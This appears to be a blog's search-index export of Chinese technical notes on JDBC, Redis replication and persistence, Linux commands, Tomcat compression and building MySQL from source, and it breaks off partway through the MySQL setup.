  <entry>
    <title><![CDATA[JDBC 笔记小结]]></title>
    <url>%2Fblog%2F2017%2F06%2F19%2FJDBC%20%E7%AC%94%E8%AE%B0%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[JDBC 详解一、JDBC 概述一般数据的存贮与读取，大多数通过各种关系数据库来完成。而JDBC可以说是Java访问数据库的基石。 1、什么是JDBCJDBC英文名为：Java Data Base Connectivity(Java数据库连接),是一个独立于特定数据库管理系统、通用的SQL数据库存取和操作的公共接口（一组API）。 JDBC定义了一套标准接口，即访问数据库的通用API，不同的数据库厂商根据各自数据库的特点去实现这些接口。如下图 Java.sql.Driver 接口是所有 JDBC 驱动程序需要实现的接口。这个接口是提供给数据库厂商使用的，不同数据库厂商提供不同的实现在程序中不需要直接去访问实现了 Driver 接口的类，而是由驱动程序管理器类(java.sql.DriverManager)去调用这些Driver实现，下面是API调用相关 2、JDBC 的工作原理 加载数据库驱动使用Class.forName方法，调用这个方法会加载数据库驱动com.mysql.jdbc.driver，向其传递要加载的 JDBC 驱动的类名。DriverManager 类是驱动程序管理器类，负责管理驱动程序，通常不用显式调用 DriverManager 类的 registerDriver() 方法来注册驱动程序类的实例，因为 Driver 接口的驱动程序类都包含了静态代码块，在这个静态代码块中，会调用 DriverManager.registerDriver() 方法来注册自身的一个实例 获取数据库连接Connection接口负责应用程序对数据库的连接，在加载驱动之后，使用url、username、password三个参数，创建到具体数据库的连接可以调用 DriverManager 类的 getConnection() 方法建立到数据库的连接JDBC URL 用于标识一个被注册的驱动程序，驱动程序管理器通过这个 URL 选择正确的驱动程序，从而建立到数据库的连接。JDBC URL的标准由三部分组成，各部分间用冒号分隔。jdbc:&lt;子协议&gt;:&lt;子名称&gt;协议：JDBC URL中的协议总是jdbc子协议：子协议用于标识一个数据库驱动程序子名称：一种标识数据库的方法。子名称可以依不同的子协议而变化，用子名称的目的是为了定位数据库提供足够的信息 访问数据库在 java.sql 包中有 3 个接口分别定义了对数据库的调用的不同方式： 123Statement PrepatedStatement -CallableStatement 通过调用 Connection 对象的 createStatement 方法创建该对象,通过ResultSet excuteQuery(String sql)和 int excuteUpdate(String sql) 执行sql语句 可以通过调用 Connection 对象的 preparedStatement() 方法获取 PreparedStatement 对象PreparedStatement 接口是 Statement 的子接口，它表示一条预编译过的 SQL 语句PreparedStatement 对象所代表的 SQL 语句中的参数用问号(?)来表示，调用 PreparedStatement 对象的 setXXX() 方法来设置这些参数. setXXX() 方法有两个参数，第一个参数是要设置的 SQL 语句中的参数的索引(从 1 开始)，第二个是设置的 SQL 语句中的参数的值 3、API小结java.sql.DriverManager 用来装载驱动程序，获取数据库连接。java.sql.Connection 完成对某一指定数据库的联接java.sql.Statement 在一个给定的连接中作为SQL执行声明的容器，他包含了两个重要的子类型。Java.sql.PreparedSatement 用于执行预编译的sql声明Java.sql.CallableStatement 用于执行数据库中存储过程的调用java.sql.ResultSet 对于给定声明取得结果的途径 4、代码示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091public class Demo &#123; /** * 测试方法 */ public void test() &#123; Connection conn = null; Statement statement = null; ResultSet rs = null; try &#123; //获得连接 conn = getConnection(); //创建statement statement = conn.createStatement(); // sql 语句 String sql = &quot;SELECT id, name, email, birth &quot; + &quot;FROM user&quot;; // 执行sql 返回结果集 rs = statement.executeQuery(sql); System.out.println(rs); // 取出数据 // rs.next():移动结果集游标到下一行，返回boolean值 while (rs.next()) &#123; int id = rs.getInt(1); String name = rs.getString(&quot;name&quot;); String email = rs.getString(3); Date birth = rs.getDate(4); System.out.println(&quot;id=&quot;+id+&quot;,name=&quot;+name+&quot;,email=&quot;+email+&quot;,birth=&quot;+birth); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;finally &#123; //释放资源 release(rs, statement, conn); &#125; &#125; /** * 通过DriverManager 返回连接 * @return * @throws Exception */ public Connection getConnection() throws Exception &#123; Properties properties = new Properties(); //读取配置文件 InputStream in = this.getClass().getClassLoader().getResourceAsStream(&quot;jdbc.properties&quot;); properties.load(in); //获取数据 String user = properties.getProperty(&quot;user&quot;); String password = properties.getProperty(&quot;password&quot;); String jdbcUrl = properties.getProperty(&quot;jdbcUrl&quot;); String driver = properties.getProperty(&quot;driver&quot;); //加载驱动 Class.forName(driver); //返回连接 return DriverManager.getConnection(jdbcUrl, user, password); &#125; /** * 释放资源 * @param rs * @param statement * @param conn */ public void release(ResultSet rs, Statement statement, Connection conn) &#123; if(rs != null)&#123; try &#123; rs.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if (statement != null) &#123; try &#123; statement.close(); &#125; catch (Exception e2) &#123; e2.printStackTrace(); &#125; &#125; if (conn != null) &#123; try &#123; conn.close(); &#125; catch (Exception e2) &#123; e2.printStackTrace(); &#125; &#125; &#125;&#125; jdbc.properties文件1234driver=com.mysql.jdbc.DriverjdbcUrl=jdbc:mysql://localhost:3306/demoDBuser=rootpassword=root 二、连接池1、不用连接池的弊端普通的JDBC数据库连接使用 DriverManager 来获取，每次向数据库建立连接的时候都要将 Connection 加载到内存中，再验证用户名和密码(得花费0.05s～1s的时间)。需要数据库连接的时候，就向数据库要求一个，执行完成后再断开连接。这样的方式将会消耗大量的资源和时间。数据库的连接资源并没有得到很好的重复利用.若同时有几百人甚至几千人在线，频繁的进行数据库连接操作将占用很多的系统资源，严重的甚至会造成服务器的崩溃。对于每一次数据库连接，使用完后都得断开。否则，如果程序出现异常而未能关闭，将会导致数据库系统中的内存泄漏，最终将导致重启数据库。这种开发不能控制被创建的连接对象数，系统资源会被毫无顾及的分配出去，如连接过多，也可能导致内存泄漏，服务器崩溃。 2、如何解决为解决传统开发中的数据库连接问题，可以采用数据库连接池技术。 数据库连接池的基本思想就是为数据库连接建立一个“缓冲池”。预先在缓冲池中放入一定数量的连接，当需要建立数据库连接时，只需从“缓冲池”中取出一个，使用完毕之后再放回去。数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是重新建立一个。数据库连接池在初始化时将创建一定数量的数据库连接放到连接池中，这些数据库连接的数量是由最小数据库连接数来设定的。无论这些数据库连接是否被使用，连接池都将一直保证至少拥有这么多的连接数量。连接池的最大数据库连接数量限定了这个连接池能占有的最大连接数，当应用程序向连接池请求的连接数超过最大连接数量时，这些请求将被加入到等待队列中。 3、连接池的优点可以看如下的工作原理图 优点 资源重用：由于数据库连接得以重用，避免了频繁创建，释放连接引起的大量性能开销。在减少系统消耗的基础上，另一方面也增加了系统运行环境的平稳性。 更快的系统反应速度数据库连接池在初始化过程中，往往已经创建了若干数据库连接置于连接池中备用。此时连接的初始化工作均已完成。对于业务请求处理而言，直接利用现有可用连接，避免了数据库连接初始化和释放过程的时间开销，从而减少了系统的响应时间 新的资源分配手段对于多应用共享同一数据库的系统而言，可在应用层通过数据库连接池的配置，实现某一应用最大可用数据库连接数的限制，避免某一应用独占所有的数据库资源 统一的连接管理，避免数据库连接泄露在较为完善的数据库连接池实现中，可根据预先的占用超时设定，强制回收被占用连接，从而避免了常规数据库连接操作中可能出现的资源泄露 4、常见的数据库连接池JDBC 的数据库连接池使用 javax.sql.DataSource 来表示，DataSource 只是一个接口，该接口通常由服务器(Weblogic, WebSphere, Tomcat)提供实现，也有一些开源组织提供实现。常见的数据库连接池： c3p0 dbcp druid proxool 5、简单的代码示例c3p0配置文件c3po-config.xml12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;c3p0-config&gt; &lt;named-config name=&quot;myC3p0&quot;&gt; &lt;!-- 指定连接数据源的基本属性 --&gt; &lt;property name=&quot;user&quot;&gt;root&lt;/property&gt; &lt;property name=&quot;password&quot;&gt;root&lt;/property&gt; &lt;property name=&quot;driverClass&quot;&gt;com.mysql.jdbc.Driver&lt;/property&gt; &lt;property name=&quot;jdbcUrl&quot;&gt;jdbc:mysql:///demo&lt;/property&gt; &lt;!-- 若数据库中连接数不足时, 一次向数据库服务器申请多少个连接 --&gt; &lt;property name=&quot;acquireIncrement&quot;&gt;5&lt;/property&gt; &lt;!-- 初始化数据库连接池时连接的数量 --&gt; &lt;property name=&quot;initialPoolSize&quot;&gt;5&lt;/property&gt; &lt;!-- 数据库连接池中的最小的数据库连接数 --&gt; &lt;property name=&quot;minPoolSize&quot;&gt;5&lt;/property&gt; &lt;!-- 数据库连接池中的最大的数据库连接数 --&gt; &lt;property name=&quot;maxPoolSize&quot;&gt;10&lt;/property&gt; &lt;!-- C3P0 数据库连接池可以维护的 Statement 的个数 --&gt; &lt;property name=&quot;maxStatements&quot;&gt;20&lt;/property&gt; &lt;!-- 每个连接同时可以使用的 Statement 对象的个数 --&gt; &lt;property name=&quot;maxStatementsPerConnection&quot;&gt;5&lt;/property&gt; &lt;/named-config&gt; &lt;/c3p0-config&gt; 修改获取连接，通过连接池获取connection123456789private static DataSource dataSource = null;// 数据库连接池应只被初始化一次.static&#123; dataSource = new ComboPooledDataSource(&quot;myC3p0&quot;);&#125;public static Connection getConnection() throws Exception &#123; return dataSource.getConnection();&#125;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>干货</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis 主从复制]]></title>
    <url>%2Fblog%2F2017%2F06%2F18%2FRedis%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Redis 集群一、准备工作 安装redis 创建3个不同端口的配置文件 二、配置文件在redis 的所在目录下创建一个 config 文件夹，并复制3份redis 的默认配置文件redis.conf 到里面。1234567mkdir config# 复制默认的配置文件到/usr/local/redis/config/ 下并重命名未redis6379.confcp /opt/redis-3.2.1/redis.conf /usr/local/redis/config/redis6379.conf# 复制其他两份cp redis6379.conf redis6380.confcp redis6379.conf redis6381.conf 上面的配置文件后面的数字代表的是启动的端口，vim 修改3个配置文件只需要修改 port,pidfile,daemonize,logfile,dbfilename这5个值 配置 说明 port 启动的端口 pidfile PID 的文件位置 daemonize 是否后台启动 logfile 产生log的文件位置 dbfilename rdb 文件配置的位置 都很简单，而且文件很长，就不粘贴了 三、启动redis 服务123bin/redis-server config/redis6379.confbin/redis-server config/redis6380.confbin/redis-server config/redis6381.conf 开启3个客户端连接各个不同端口的服务器，身份都是master 四、配置主从关系通过slaveof ip 端口 的命令，把6380和6381当slave的身份。在两台从服务器上运行如下命令：1SLAVEOF 127.0.0.1 6379 如下图： 除了手动写命令连接之外，也可以在redis6380.conf(和redis6381.conf)配置文件中配置: slaveof &lt;masterip&gt; &lt;masterport&gt; 配置这行为：SLAVEOF 127.0.0.1 6379 现在在6379端口设置值，我们测试在6380和6381端口能不能获取值 如果master 宕机了，slave 还是slave 如果master 又重新启动了，它还是会变成原来的master 如果slave 宕机了，启动之后不会变成slave,除非写进配置文件，不然它就会变成一个单机的服务器 如果我们想让slave 可以上位的话，可以看下面的哨兵模式。 五、哨兵模式哨兵模式简单的说呢，就是反客为主，就是主机死了，从所有从机中选出一个主机。 1、配置哨兵文件我们在redis6379.conf 的同目录下创建一个sentinel.conf编辑内容如下：12# localhost6379是我随便取的一个主机的名字sentinel monitor localhost6379 127.0.0.1 6379 1 上面的意思：就是监控6379这主机挂了的时候，从机来投票，谁得票数多谁就是主机！ 上面的sentinel.conf 也是有默认的配置文件，也可以复制默认的配置文件，然后根据自己的需求来修改即可。 2、启动哨兵模式1bin/redis-sentinel config/sentinel.conf 3、监听测试现在我们让6379死机，看一下哨兵会发生什么 看看哨兵的情况，是否发生变化 看上面的日志，我们可以看到6381变成主机了，如下图： 然后当6379启动的时候，变成了从机，而不是主机了]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis 笔记总结]]></title>
    <url>%2Fblog%2F2017%2F06%2F18%2FRedis%20%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[很早之前就使用redis 了，但都没有好好总结过，来一次吧 一、Redis 事务1、redis 与mysql事务的对比 mysql redis 开启 start transaction multi 语句 普通的sql语句 普通的命令 失败 rollback 回滚 discard 取消 成功 commit exec 注意一: rollback与discard 的区别如果已经成功执行了2条语句, 第3条语句出错.Rollback后,前2条的语句影响消失.Discard只是结束本次事务,前2条语句造成的影响仍然还在 注意二:在multi后面的语句中, 语句出错可能有2种情况 1: 语法就有问题,这种,exec时,报错, 所有语句得不到执行 2: 语法本身没错,但适用对象有问题. 比如 zadd 操作list对象Exec之后,会执行正确的语句,并跳过有不适当的语句. (如果zadd操作list这种事怎么避免? 这一点,由程序员负责) 2、watch命令Redis的事务中,启用的是乐观锁,只负责监测key没有被改动。所以我们有需要的可以watch监听某个值是否发生了变化。例:1234567891011121314redis 127.0.0.1:6379&gt; watch ticketOKredis 127.0.0.1:6379&gt; multiOKredis 127.0.0.1:6379&gt; decr ticketQUEUEDredis 127.0.0.1:6379&gt; decrby money 100QUEUEDredis 127.0.0.1:6379&gt; exec(nil) // 返回nil,说明监视的ticket已经改变了,事务就取消了.redis 127.0.0.1:6379&gt; get ticket&quot;0&quot;redis 127.0.0.1:6379&gt; get money&quot;200&quot; watch key1 key2 ... keyN作用:监听key1 key2..keyN有没有变化,如果有变, 则事务取消 unwatch作用: 取消所有watch监听 二、redis 持久化Redis的持久化有2种方式 1快照 2是日志 1、Rdb快照的配置选项每隔N秒或N次写操作后, 从内存dump数据形成rdb文件12345678910save 900 1 # 900内,有1条写入,则产生快照 save 300 1000 # 如果300秒内有1000次写入,则产生快照save 60 10000 # 如果60秒内有10000次写入,则产生快照# (这3个选项都屏蔽,则rdb禁用)stop-writes-on-bgsave-error yes # 后台备份进程出错时,主进程停不停止写入?rdbcompression yes # 导出的rdb文件是否压缩Rdbchecksum yes # 导入rbd恢复时数据时,要不要检验rdb的完整性dbfilename dump.rdb #导出来的rdb文件名dir ./ #rdb的放置路径 可以手动保存dump文件，使用命令：save 或者bgsave命令两者的区别：save只管保存，其他不管，全部阻塞，bgsave 会在后台异步进行快照操作，还可以响应客户端请求 2、Aof 的配置把所有可写的操作都记录下来1234567appendonly no # 是否打开 aof日志功能appendfsync always # 每1个命令,都立即同步到aof. 安全,速度慢appendfsync everysec # 折衷方案,每秒写1次appendfsync no # 写入工作交给操作系统,由操作系统判断缓冲区大小,统一写入到aof. 同步频率低,速度快,no-appendfsync-on-rewrite yes: # 正在导出rdb快照的过程中,要不要停止同步aofauto-aof-rewrite-percentage 100 #aof文件大小比起上次重写时的大小,增长率100%时,重写auto-aof-rewrite-min-size 64mb #aof文件,至少超过64M时,重写 可以手动重写使用命令：bgrewriteaof命令如果aof 文件出现异常，可以使用bin目录下的redis-check-aof 来修复，命令：redis-check-aof -fix test.aof.同理，如果 dump 文件出现异常也可以使用redis-check-dump来修复。 3、常见问题123456789101112131415161718192021222324252627问: 在dump rdb过程中,aof如果停止同步,会不会丢失?答: 不会,所有的操作缓存在内存的队列里, dump完成后,统一操作.问: aof重写是指什么?答: aof重写是指把内存中的数据,逆化成命令,写入到.aof日志里.以解决 aof日志过大的问题.bgrewriteaof 命令就是手动重写。如果,flushall之后,系统恰好bgrewriteaof了,那么aof就清空了,数据丢失.问: 如果rdb文件,和aof文件都存在,优先用谁来恢复数据?答: aof问: 2种是否可以同时用?答: 可以,而且推荐这么做问: 恢复时rdb和aof哪个恢复的快答: rdb快,因为其是数据的内存映射,直接载入到内存,而aof是命令,需要逐条执行问: 如果不小心运行了flushall, 怎么办？答：立即 shutdown nosave ,关闭服务器，然后 手工编辑aof文件, 去掉文件中的 “flushall ”相关行, 然后开启服务器,就可以导入回原来数据.问:多慢才叫慢? 答: 由slowlog-log-slower-than 10000 ,来指定,(单位是微秒)问：服务器储存多少条慢查询的记录?答: 由 slowlog-max-len 128 ,来做限制 三、消息订阅与发布1、消息的订阅12345678# 订阅频道channel1subscribe channel1# 订阅多个频道subscribe channel1 channel2 channel3# 订阅多个，通配符*subscribe new* 2、发布消息12345# 往通道chanel1 发布内容publish chanel1 发布的消息内容# 往通道news 发布消息publish news xxxxx 慢慢更新吧]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 一些常用命令]]></title>
    <url>%2Fblog%2F2017%2F06%2F11%2FLinux%20%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[cat 命令12345cat -n textfile1 &gt; textfile2 #把 textfile1 的文档内容加上行号后输入 textfile2 这个文档里cat /dev/null &gt; /etc/test.txt #清空 /etc/test.txt 文档内容cat error.log | grep -C 5 &apos;goods&apos; #显示file文件里匹配goods字串那行以及上下5行cat error.log | grep -B 5 &apos;goods&apos; #显示goods及前5行cat error.log | grep -A 5 &apos;goods&apos; #显示goods及后5行 tail 命令12tail -n 100 error.log #显示error.log的最后100行tail -n +100 error.log #显示error.log从100行开始 head 命令123head -n 10 error.log #显示前10条head -n +10 error.log #显示前10条head -10 error.log #显示前10条 ps 命令123ps -l #将目前属于您自己这次登入的 PID 与相关信息列示出来ps aux #列出目前所有的正在内存当中的程序ps aux | grep tomcat #列出与tomcat有关的pid df,du 命令123456df # 显示磁盘使用的文件系统信息df -h # -h选项，通过它可以产生可读的格式df命令的输出du # 显示目录或者文件所占空间du -h test # 方便阅读的格式显示test目录所占空间情况du -h --max-depth=1 # 显示当前文件夹下，格式化各个文件的大小du -h --max-depth=1 /usr #显示/usr 文件夹下的各个文件的大小 free 命令12# 显示系统内存的使用情况，-m是 以MB 为单位显示，其他参数可通过 --help 来查看free -m chmod 命令123456chmod ugo+r file1.txt #将文件 file1.txt 设为所有人皆可读取 :chmod a+r file1.txt #将文件 file1.txt 设为所有人皆可读取 :chmod 777 file #将文件 file1.txt 设为所有人皆可读取 数字，r=4，w=2，x=1chmod ug+w,o-w file1.txt file2.txt #将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :chmod u+x ex1.py #将 ex1.py 设定为只有该文件拥有者可以执行chmod -R a+r * #将目前目录下的所有文件与子目录皆设为任何人可读取 scp命令1scp /mnt/backup/gdweb.war root@192.168.1.1:/root/gdweb.war #192.168.1.1 就是目标主机ip， kill 命令12# 杀掉所有mongod 的所有进程，-2 比较好，-9 有点暴力kill -2 $(pidof mongod) rpm 命令12# 查看 pcre 是否安装，要查看其他的，把pcre 改成你要检查的程序即可，比如 查看java是否安装 :rpm -qa javarpm -qa pcre groupadd 命令格式：groupadd 选项 用户组其中各选项含义如下：代码:-g GID 指定新用户组的组标识号（GID）。-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。12# 创建一个用户组：supermangroupadd superman useradd 命令格式：useradd 选项 用户名其中各选项含义如下：代码:-c comment 指定一段注释性描述。-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。-g 用户组 指定用户所属的用户组。-G 用户组，用户组 指定用户所属的附加组。-s Shell文件 指定用户的登录Shell。-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。12# 创建一个用户：rstyrouseradd -d /usr/rstyro -m -g es rstyro]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 安装redis 并配置服务]]></title>
    <url>%2Fblog%2F2017%2F06%2F09%2FLinux%20%E5%AE%89%E8%A3%85redis%E3%80%80%E5%B9%B6%E9%85%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[Centos 安装redis 并配置服务1.下载源码包1234wget http://download.redis.io/releases/redis-3.2.1.tar.gztar -zxvf redis-3.2.1.tar.gz -C /opt/cd /opt/redis-3.2.1/make PREFIX=/usr/local/redis-3.2.1 install //指定安装的路径, 可能报错 zmalloc.h:50:31: error: jemalloc/jemalloc.h: No such file or directoryzmalloc.h:55:2: error: #error “Newer version of jemalloc required”make[1]: [adlist.o] Error 1make[1]: Leaving directory `/data0/src/redis-2.6.2/src’make: [all] Error 2 可以改成 make MALLOC=libc PREFIX=/usr/local/redis installll /usr/local/redis-3.2.1/bin 2、添加服务a)、这个是centos6 的service 命令1、创建服务脚本1234cp /opt/redis-3.0.6/utils/redis_init_script /etc/rc.d/init.d/redismkdir /etc/redis #创建redis目录，是为了以后可以存放多个redis配置 cp /opt/redis-3.0.6/redis.conf /etc/redis/6379.conf vim /etc/rc.d/init.d/redis #修改如下圈出来的地方 前面两行注释是：redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10。 2、修改配置文件1vim /etc/redis/6379.conf 把daemnize no改为yes，意思是后台运行3、添加服务12345chkconfig --add redis #如果没报错的话，说明成功，可以用chkconfig --list #查看所有服务service redis start #启动redis服务器ps -ef | grep redis #查看是否启动成功 b)、这个是centos 7 的systemctl 命令使用systemctl 命令之前先来说说 systemctl脚本的配置位置：/lib/systemd/system/1234567891011121314151617[Unit] 部分主要是对这个服务的说明，内容包括Description和After， Description 用于描述服务， After 用于描述服务类别;[Service] 部分是服务的关键，是服务的一些具体运行参数的设置， 这里: Type=forking 是后台运行的形式， PIDFile 为存放PID的文件路径， ExecStart 为服务的运行命令， ExecReload 为重启命令， ExecStop 为停止命令， PrivateTmp=True 表示给服务分配独立的临时空间， [Install] 部分是服务安装的相关设置，可设置为多用户的 1、创建redis 脚本1vim /lib/systemd/system/redis.service 2、编辑内容1234567891011121314[Unit]Description=RedisAfter=syslog.target network.target remote-fs.target nss-lookup.target[Service]Type=forkingPIDFile=/var/run/redis_6379.pidExecStart=/usr/local/redis/bin/redis-server /etc/redis/6379.confExecReload=/bin/kill -s HUP $MAINPIDExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true[Install]WantedBy=multi-user.target 先说明一下啊，上面的：PIDFile 这个值要和 上面配置脚本中的 ExecStart命令启动 redis 的配置文件（/etc/redis/6379.conf）里的pidfile 一样，比如下图： ExecStart 前面是redis启动的服务脚本 空格 之后是启动需要的配置文件路径3、重载系统服务1systemctl daemon-reload 4、启动redis 服务1systemctl start redis-server.service 5、开机自启动 (可选)1systemctl enable redis-server.service ### 结束，配置不成功，评论说明，不出意外 ３分钟之内回复]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[遍历Map的几种方式]]></title>
    <url>%2Fblog%2F2017%2F06%2F05%2F%E9%81%8D%E5%8E%86Map%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[#遍历Map的几种方式 方法一123for (String key : map.keySet())&#123; System.out.println(&quot;key= &quot;+ key + &quot; and value= &quot; + map.get(key));&#125; 方法二12345Iterator&lt;Map.Entry&lt;String, String&gt;&gt; it = map.entrySet().iterator(); while (it.hasNext()) &#123; Map.Entry&lt;String, String&gt; entry = it.next(); System.out.println(&quot;key= &quot; + entry.getKey() + &quot; and value= &quot; + entry.getValue());&#125; 方法三 （推荐）123for (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123; System.out.println(&quot;key= &quot; + entry.getKey() + &quot; and value= &quot; + entry.getValue());&#125; 方法四123for (String v : map.values()) &#123; System.out.println(&quot;value= &quot; + v);&#125; 顺便把遍历proerties也说下，有点类似初始化proerties12Properties prop = new Properties();//TODO.... 方法一：123456Enumeration&lt;String&gt; eee = (Enumeration&lt;String&gt;) prop.propertyNames();while (eee.hasMoreElements()) &#123; String key = (String) eee.nextElement(); String value = prop.getProperty(key); System.out.println(&quot;key= &quot;+ key + &quot; and value= &quot; +value);&#125; 方法二：123456Enumeration&lt;Object&gt; enu = prop.elements(); while (enu.hasMoreElements()) &#123; Object value = enu.nextElement(); System.out.println(value); &#125;` 方法三：1234567Iterator&lt;Entry&lt;Object, Object&gt;&gt; it = prop.entrySet().iterator(); while (it.hasNext()) &#123; Entry&lt;Object, Object&gt; entry = it.next(); Object key = entry.getKey(); Object value = entry.getValue(); System.out.println(&quot;key :&quot; + key+&quot;,value:&quot;+value); &#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat 开启网页压缩的方法]]></title>
    <url>%2Fblog%2F2017%2F06%2F01%2FTomcat%20%E5%BC%80%E5%90%AF%E7%BD%91%E9%A1%B5%E5%8E%8B%E7%BC%A9%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[##我曾在站长工具（http://seo.chinaz.com/lrshuai.top） 看到别人的网页都是压缩的，我就想着 这怎么弄的。 ##压缩可以大大提高浏览网站的速度，它的原理是，在客户端请求网 页后，从服务器端将网页文件压缩，再下载到客户端，由客户端的浏览器负责解 压缩并浏览。相对于普通的浏览过程HTML ,CSS,Javascript , Text ，它可以节省40%左右的流量 ###然后百度，看到的是打开 Internet信息服务管理器，没有这东西，又继续找，找到了，很简单，修改tomcat 的conf文件夹下的 server.xml 文件 修改如下图所示： 添加4行代码 1234compression=&quot;on&quot;compressionMinSize=&quot;2048&quot;noCompressionUserAgents=&quot;gozilla, traviata&quot;compressableMimeType=&quot;text/html,text/xml,text/javascript,text/css,text/plain&quot; 保存退出，重启tomcat，然后去 http://seo.chinaz.com/lrshuai.top 检测检测]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>开发工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7源码安装mysql5.7]]></title>
    <url>%2Fblog%2F2017%2F05%2F20%2FCentos7%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85mysql5.7%2F</url>
    <content type="text"><![CDATA[一、下载源码包官网：https://dev.mysql.com/downloads/file/?id=4716581wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.19.tar.gz 二、解压12# -C 解压到指定目录： 如下命令，解压到 /opt/tar -zxvf mysql-5.7.18.tar.gz -C /opt/ 三、安装运行环境1yum -y install gcc-c++ ncurses-devel cmake make perl gcc autoconf automake zlib libxml libgcrypt libtool bison 还缺什么自己yum 安装一下就可以了。 四、编译 注意：下面的命令都要进入到刚解压的目录下执行 (1)、cmake1234567891011cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/data -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DMYSQL_TCP_PORT=3306 -DMYSQL_USER=mysql -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/usr/local/boost 参数解析 参数 描述说明 CMAKE_INSTALL_PREFIX 指定MySQL程序的安装目录，默认/usr/local/mysql DEFAULT_CHARSET 指定服务器默认字符集，默认latin1 DEFAULT_COLLATION 指定服务器默认的校对规则，默认latin1_general_ci ENABLED_LOCAL_INFILE 指定是否允许本地执行LOAD DATA INFILE，默认OFF WITH_COMMENT 指定编译备注信息 WITH_xxx_STORAGE_ENGINE 指定静态编译到mysql的存储引擎，MyISAM，MERGE，MEMBER以及CSV四种引擎默认即被编译至服务器，不需要特别指定。 WITHOUT_xxx_STORAGE_ENGINE 指定不编译的存储引擎 SYSCONFDIR 初始化参数文件目录 MYSQL_DATADIR 数据文件目录 MYSQL_TCP_PORT 服务端口号，默认3306 MYSQL_UNIX_ADDR socket文件路径，默认/tmp/mysql.sock 如果这个cmake 失败，则需要删除CMakeCache.txt文件。命令：rm -f CMakeCache.txtmysql 5.7 要boost 1.59的，如果命令下载不下来，则自己手动安装。命令如下: 123# 如果没有boost 目录则自己创建，命令：mkdir /usr/local/boostcd /usr/local/boostwget http://liquidtelecom.dl.sourceforge.net/project/boost/boost/1.59.0/boost_1_59_0.tar.gz (2)、make &amp;&amp; make install1make &amp;&amp; make install 如果上面的命令出错，又再进行编译之前，要clean 一下。命令：make clean (3)、可能发生的异常 g++: internal compiler error: Killed (program cc1plus)Please submit a full bug report, 异常原因：可能是内存不足，导致的解决方法：设置2G交换分区来用12345dd if=/dev/zero of=/swapfile bs=1k count=2048000 #获取要增加的2G的SWAP文件块mkswap /swapfile #创建SWAP文件swapon /swapfile #激活SWAP文件swapon -s #查看SWAP信息是否正确echo &quot;/var/swapfile swap swap defaults 0 0&quot; &gt;&gt; /etc/fstab #添加到fstab文件中让系统引导时自动启动 注意, swapfile文件的路径在/var/下,编译完后, 如果不想要交换分区了, 可以删除: 五.配置MySQL1、查看是否有mysql用户及用户组12cat /etc/passwd 查看用户列表cat /etc/group 查看用户组列表 2、没有就添加1234#添加组，名为 mysqlgroupadd mysql#添加 mysql 用户到mysql 组useradd -g mysql mysql 3、设置权限并初始化MySQL系统授权表123cd /usr/local/mysql/chown -R mysql .chgrp -R mysql . 4、启动123#以root初始化操作时要加–user=mysql参数，生成一个随机密码（注意保存登录时用）cd /usr/local/mysqlbin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data 随机密码图如下： 5、初始化配置1、进入安装路径，将默认生成的my.cnf备份12cd /usr/local/mysqlmv /etc/my.cnf /etc/my.cnf.bak 